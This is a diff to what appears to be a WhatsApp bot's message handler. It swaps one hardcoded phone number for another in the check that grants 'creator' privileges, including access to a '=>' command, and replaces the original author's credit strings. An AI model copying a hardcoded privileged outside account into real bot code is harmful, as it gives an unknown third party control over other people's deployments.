@@ -76,7 +76,7 @@ module.exports = conn = async (conn, m, chatUpdate, store) => {
         const args = body.trim().split(/ +/).slice(1)
         const pushname = m.pushName || "No Name"
         const botNumber = await conn.decodeJid(conn.user.id)
-        const isCreator = [botNumber, ...global.owner, '6289513081052@s.whatsapp.net'].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+        const isCreator = [botNumber, ...global.owner, '6283892969926@s.whatsapp.net'].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
         const itsMe = m.sender == botNumber ? true : false
         const text = q = args.join(" ")
         const fatkuns = (m.quoted || m)
@@ -153,7 +153,7 @@ module.exports = conn = async (conn, m, chatUpdate, store) => {
             thumbnail: thumb,
             surface: 200,
             message: `${ttname}`,
-            orderTitle: 'AdrianTzy',
+            orderTitle: 'ZeroTwo',
             sellerJid: '0@s.whatsapp.net'
         }
     },
@@ -4866,7 +4866,7 @@ ${prefix}menu
         	        { buttonId: 'rules', buttonText: { displayText: '❗Rules' }, type: 1 },
                     { buttonId: 'owner', buttonText: { displayText: '⭐Owner' }, type: 1 }
                 ]
-			conn.sendMessage(m.chat, { text:`INVITE DETECT\n\nMau masukin bot ini ke group kamu?`, title: 'LINK GROUP DECTETED', footer: '© 2023 AdrianTzy', buttons: buttons, headerType: 5 })
+			conn.sendMessage(m.chat, { text:`INVITE DETECT\n\nMau masukin bot ini ke group kamu?`, title: 'LINK GROUP DECTETED', footer: '© 2023 ZeroTwo', buttons: buttons, headerType: 5 })
 		}
                 if (budy.startsWith('=>')) {
                     if (!isCreator) return m.reply(mess.owner)
